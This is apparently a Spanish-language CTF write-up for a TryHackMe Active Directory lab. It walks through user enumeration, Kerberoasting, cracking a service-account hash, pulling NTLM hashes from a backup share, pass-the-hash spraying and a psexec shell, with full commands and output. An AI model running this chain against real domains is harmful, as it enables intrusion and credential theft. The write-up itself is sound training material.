---
tags:
title: Soupedecode 01 - Easy (THM)
permalink: /Soupedecode01-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.66.189.129
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 14:23 -0400
Initiating Ping Scan at 14:23
Scanning 10.66.189.129 [4 ports]
Completed Ping Scan at 14:23, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:23
Completed Parallel DNS resolution of 1 host. at 14:23, 0.50s elapsed
Initiating SYN Stealth Scan at 14:23
Scanning 10.66.189.129 [65535 ports]
Discovered open port 3389/tcp on 10.66.189.129
Discovered open port 139/tcp on 10.66.189.129
Discovered open port 53/tcp on 10.66.189.129
Discovered open port 445/tcp on 10.66.189.129
Discovered open port 135/tcp on 10.66.189.129
Discovered open port 9389/tcp on 10.66.189.129
Discovered open port 49667/tcp on 10.66.189.129
Discovered open port 49673/tcp on 10.66.189.129
Discovered open port 49664/tcp on 10.66.189.129
Discovered open port 593/tcp on 10.66.189.129
Discovered open port 49729/tcp on 10.66.189.129
Discovered open port 88/tcp on 10.66.189.129
Discovered open port 3269/tcp on 10.66.189.129
Discovered open port 389/tcp on 10.66.189.129
Discovered open port 3268/tcp on 10.66.189.129
Discovered open port 464/tcp on 10.66.189.129
Discovered open port 636/tcp on 10.66.189.129
Completed SYN Stealth Scan at 14:23, 13.34s elapsed (65535 total ports)
Nmap scan report for 10.66.189.129
Host is up, received echo-reply ttl 126 (0.17s latency).
Scanned at 2026-03-17 14:23:29 EDT for 14s
Not shown: 65518 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 126
88/tcp    open  kerberos-sec     syn-ack ttl 126
135/tcp   open  msrpc            syn-ack ttl 126
139/tcp   open  netbios-ssn      syn-ack ttl 126
389/tcp   open  ldap             syn-ack ttl 126
445/tcp   open  microsoft-ds     syn-ack ttl 126
464/tcp   open  kpasswd5         syn-ack ttl 126
593/tcp   open  http-rpc-epmap   syn-ack ttl 126
636/tcp   open  ldapssl          syn-ack ttl 126
3268/tcp  open  globalcatLDAP    syn-ack ttl 126
3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
3389/tcp  open  ms-wbt-server    syn-ack ttl 126
9389/tcp  open  adws             syn-ack ttl 126
49664/tcp open  unknown          syn-ack ttl 126
49667/tcp open  unknown          syn-ack ttl 126
49673/tcp open  unknown          syn-ack ttl 126
49729/tcp open  unknown          syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
           Raw packets sent: 131062 (5.767MB) | Rcvd: 23 (996B)
-e [*] IP: 10.66.189.129
[*] Puertos abiertos: 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,49673,49729
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,49673,49729 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 14:23 -0400
Nmap scan report for 10.66.189.129
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-17 18:23:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   DNS_Tree_Name: SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-17T18:24:42+00:00
|_ssl-date: 2026-03-17T18:25:22+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2026-03-16T18:22:38
|_Not valid after:  2026-09-15T18:22:38
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49729/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-17T18:24:44
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.79 seconds
```
### Enumerate users

Luego de una enumeración básica, no encontré nada, por lo que empecé a enumerar usuarios validos.

```bash
zs1n@ptw ~> nxc smb soupedecode.local -u guest -p '' --rid-brute
SMB         10.66.189.129   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.66.189.129   445    DC01             [+] SOUPEDECODE.LOCAL\guest:
SMB         10.66.189.129   445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.66.189.129   445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB         10.66.189.129   445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB         10.66.189.129   445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB         10.66.189.129   445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB         10.66.189.129   445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB         10.66.189.129   445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB         10.66.189.129   445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
SMB         10.66.189.129   445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
SMB         10.66.189.129   445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
SMB         10.66.189.129   445    DC01             518: SOUPEDECODE\Schema Admins (SidTypeGroup)
SMB         10.66.189.129   445    DC01             519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
SMB         10.66.189.129   445    DC01             520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.66.189.129   445    DC01             521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.66.189.129   445    DC01             522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.66.189.129   445    DC01             525: SOUPEDECODE\Protected Users (SidTypeGroup)
SMB         10.66.189.129   445    DC01             526: SOUPEDECODE\Key Admins (SidTypeGroup)
SMB         10.66.189.129   445    DC01             527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
SMB         10.66.189.129   445    DC01             553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
SMB         10.66.189.129   445    DC01             571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.66.189.129   445    DC01             572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.66.189.129   445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB         10.66.189.129   445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
SMB         10.66.189.129   445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
SMB         10.66.189.129   445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
SMB         10.66.189.129   445    DC01             1104: SOUPEDECODE\otara1 (SidTypeUser)
..snip..
```
### Kerberoasting

Use los nombres de usuario para realizar un `Kerberoasting` contra los mismos, viendo así varios hashes dentro de los cuales estaba el del usuario `file_svc`.

```bash
zs1n@ptw ~> impacket-GetUserSPNs  soupedecode.local/guest -no-pass -dc-ip 10.66.189.129 -usersfile users
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
..snip..
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$file_svc*$74d92c17b68b0e50532d433eb9b8449f$d033ce785871bc31d4edbf6a225668e0f2d73c666b2b80b4678c4ff3f461f95c755dbe6fb84ac3c325574b4141c0d67d1dd2b5e97c6e915608e96ef3d02dbc79eb2817b8c19d626d80cc43dca455150f64c75589daf20e622af907881a7251aaa23bffef7bdd40300536ce8fb2a18054bab127733154be3753845208e2fe76900d178cbce4df8d82a6a172ecf183f1c577aa7fb6ad631fead86c89cf3427eb12266b0f5f8b41ffdced07eebf1348b2ded74001947653198667e8d7d43c5296797f62e30c5f9f1fe8e6c81390fecbc0c37efd51c5f888ddea3602251f2a700838591e04144e70c15fc1374f7638bea63b9cad30684477c4ab94d95978c28434363170797d4dfbe4b6387ec9a699bf1fbcab17ab7a4883336df9ac7cc7120875642a93bbb679db2567c9ea7b8a1c2fb447c0d281aec2a34f444351224f19c8b0f170c6daec097cd47727969a27c17609356e90f4dfb47dc800a41f519166f3781e9432cf3795839a30b6b4551f4f99ce5d1c6ba6d21eeefdc21ae4cef12f561ebb3d435ad6b3a2a4b5571bdc3520486a43c090467e6803016168f8fe28f7ca522ca817784aa5664836951f3a1db80466837874a7cfff5bf787143beb58d488c7330dcab40e900ef30b9cd4e16b654f6af867fec7431b59e51256b71af52b0445dd83c8f8c76d553b0259f17ce0decebd4fac6032a14d1e2db3483c45ca2cd8574ed065bb81f8ccdb2167c3b2b26f7229bb09b346065f9121f10774fcabbebe98bd40a1aba5c69204961157320745c07a13bf0fb98fc23c12320f00efb9e9deb22ad75c286baed802197929e175a82205dd055337c4d2fb0fd033cd0e7ec068d2716cd7aa68c01ee706ae6f08d4f52f1a797b0c4e21a7903f9ad051558bc42762611d388a9c2cf57b20987c397989573d08072926f627e95fe4e084274f3124dc0581cb74cacaf89c6dd2c7a00c420323216a0948df17bcdfca3c9f24f1352fd0807d5dd54941f5bede7bfb16feeb847eea96757dd8b81389c44b65a969784c40bc2d1b6287d5a6269dd4f76d049464adf369b03ed71ce7f093d1b112fdb80da0e3affa658b521b14adcf6a90f9ddc1dd98daafcd569d0029691baeb473c14d015be26b0c66a49906bd6b03af01530e83ffba3a56c78b4cb6b9cbaefcfbb4fe0b3e2ddc5921139d9d72859fbb041fd0cf1c49e9033e01679bada1cdd1ce926021fbad1efc30fa095a7b17aa629efecdcd9e27d862972c3b34afa30282f4224570a85bc713fe901fa696deea2ad2fc294c302bcb3234751d5790c0d265aaf068443073cb4a2ab938929ca5e2beb414a6ff2df38dd5f284708581e3d6279e67fd9f255ded81da22c270e69dc7fe36a6f7b585af2091120992d6777160c4a525f9816d959fb6afa319b81d75b3f01c66e553fad0d13fcbf7c92fb358c6a950eeaf56
```
## Shell as fileserver$
### Crack password

Rompí el mismo con `john`.

```bash
zs1n@ptw ~> j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!!    (?)
1g 0:00:00:05 DONE (2026-03-17 14:30) 0.1751g/s 1879Kp/s 1879Kc/s 1879KC/s Passwordas..Parade2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Shares

Con las credenciales de este usuario, enumere `shares`, viendo `backup`

```bash
zs1n@ptw ~> nxc smb 10.66.189.129 -u 'file_svc' -p 'Password123!!' --shares
SMB         10.66.189.129   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.66.189.129   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
SMB         10.66.189.129   445    DC01             [*] Enumerated shares
SMB         10.66.189.129   445    DC01             Share           Permissions     Remark
SMB         10.66.189.129   445    DC01             -----           -----------     ------
SMB         10.66.189.129   445    DC01             ADMIN$                          Remote Admin
SMB         10.66.189.129   445    DC01             backup          READ
SMB         10.66.189.129   445    DC01             C$                              Default share
SMB         10.66.189.129   445    DC01             IPC$            READ            Remote IPC
SMB         10.66.189.129   445    DC01             NETLOGON        READ            Logon server share
SMB         10.66.189.129   445    DC01             SYSVOL          READ            Logon server share
SMB         10.66.189.129   445    DC01             Users
```

Por lo que me conecte con `smbclient` de impacket y me descargue el archivo que había dentro.

```bash
zs1n@ptw ~> impacket-smbclient soupedecode.local/file_svc:'Password123!!'@dc01.soupedecode.local -dc-ip 10.66.189.129
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use backup
# ls
drw-rw-rw-          0  Mon Jun 17 13:41:17 2024 .
drw-rw-rw-          0  Fri Jul 25 13:51:20 2025 ..
-rw-rw-rw-        892  Mon Jun 17 13:41:23 2024 backup_extract.txt
# get backup_extract.txt
# exit
```
### Hash spraying

Dentro del mismo habían varios usuarios con sus respectivos hashes `NTLM`.

```bash
zs1n@ptw ~> cat backup_extract.txt
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

Por lo que use `nxc` para probar cada combinación del mismo con cada usuario del archivo, usando solamente el hash `NT`.

```bash
zs1n@ptw ~> nxc smb soupedecode.local -u posibles_users.txt -H nthash.txt
SMB         10.66.189.129   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.66.189.129   445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE
..snip..
SMB         10.66.189.129   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```
### Shell

Luego usando las credenciales del mismo me conecte con `pexec`.

```bash
zs1n@ptw ~> impacket-psexec soupedecode.local/'FileServer$'@dc01.soupedecode.local -dc-ip 10.66.189.129 -hashes :e41da7e79a4c76dbd9cf79d1cb325559
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc01.soupedecode.local.....
[*] Found writable share ADMIN$
[*] Uploading file daIjwZQb.exe
[*] Opening SVCManager on dc01.soupedecode.local.....
[*] Creating service XqVG on dc01.soupedecode.local.....
[*] Starting service XqVG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is CCB5-C4FB

 Directory of C:\Users\Administrator\Desktop

07/25/2025  10:51 AM    <DIR>          .
03/17/2026  11:33 AM    <DIR>          ..
06/17/2024  10:41 AM    <DIR>          backup
07/25/2025  10:51 AM                33 root.txt
               1 File(s)             33 bytes
               3 Dir(s)  43,863,801,856 bytes free

C:\Users\Administrator\Desktop> type root.txt
27cb2be302c388d63d27c86bfdd5f56a
```

```bash
C:\Users\ybob317\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is CCB5-C4FB

 Directory of C:\Users\ybob317\Desktop

07/25/2025  10:51 AM    <DIR>          .
06/17/2024  10:24 AM    <DIR>          ..
07/25/2025  10:51 AM                33 user.txt
               1 File(s)             33 bytes
               2 Dir(s)  43,863,801,856 bytes free

C:\Users\ybob317\Desktop> type user.txt
28189316c25dd3c0ad56d44d000d62a8
```

`~Happy Hacking.`